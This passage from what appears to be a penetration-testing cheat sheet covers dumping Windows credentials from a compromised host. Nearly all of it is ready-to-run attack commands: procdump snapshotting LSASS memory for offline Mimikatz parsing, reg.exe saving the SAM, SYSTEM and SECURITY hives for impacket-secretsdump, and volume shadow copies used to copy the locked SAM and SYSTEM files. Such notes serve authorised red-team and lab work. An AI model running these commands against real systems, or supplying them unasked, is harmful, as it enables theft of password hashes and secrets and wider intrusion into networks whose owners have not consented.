We can also parse system secrets without using Mimikatz on the target system directly.

#### Dumping LSASS

The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. [Dumpert](https://github.com/outflanknl/Dumpert), [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), or other (custom) tooling can be used to dump LSASS memory.

```powershell
# Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly
.\procdump.exe -r -ma lsass.exe lsass.dmp
```

After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to ‚ÄòMinidump‚Äô mode to parse the file as follows. After this, we can run Mimikatz‚Äô credential retrieval commands as usual.

```plaintext
sekurlsa::minidump lsass.dmp
```

#### Dumping secrets from the registry

We can dump secrets from the registry and parse the files ‚Äúoffline‚Äù to get a list of system secrets. üö©

On the target, we run the following:

```powershell
reg.exe save hklm\sam c:\users\public\downloads\sam.save
reg.exe save hklm\system c:\users\public\downloads\system.save
reg.exe save hklm\security c:\users\public\downloads\security.save
```

Then on our attacking box we can dump the secrets with Impacket:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out
```

#### Dumping secrets from a Volume Shadow Copy

We can also create a ‚ÄúVolume Shadow Copy‚Äù of the `SAM` and `SYSTEM` files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.

```powershell
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save
```